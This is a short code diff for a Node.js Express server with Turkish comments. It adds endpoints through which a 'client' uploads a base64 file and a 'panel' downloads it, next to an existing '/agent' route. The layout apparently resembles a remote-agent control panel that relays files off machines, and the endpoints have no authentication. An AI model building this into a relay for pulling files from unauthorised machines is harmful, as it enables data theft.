@@ -15,6 +15,25 @@ app.get('/', (req, res) => {
     res.send("Sunucu aktif! /panel adresine giderek verileri görebilirsin.");
 });
 
+// Gelen dosya verisini burada tutacağız
+let tempFileStorage = {
+    fileName: "",
+    data: null // Base64 verisi buraya gelecek
+};
+
+// CLIENT DOSYAYI BURAYA YÜKLER
+app.post('/upload', (req, res) => {
+    tempFileStorage.fileName = req.body.fileName;
+    tempFileStorage.data = req.body.data; // Base64 metni
+    console.log(`${tempFileStorage.fileName} sunucuya yüklendi.`);
+    res.json({ status: "File uploaded to server" });
+});
+
+// PANEL DOSYAYI BURADAN ÇEKER
+app.get('/download-file', (req, res) => {
+    res.json(tempFileStorage);
+});
+
 // AGENT KAPISI (Hem GET hem POST destekli yapalım ki hata almayasın)
 app.all('/agent', (req, res) => {
     if (req.method === 'POST') {
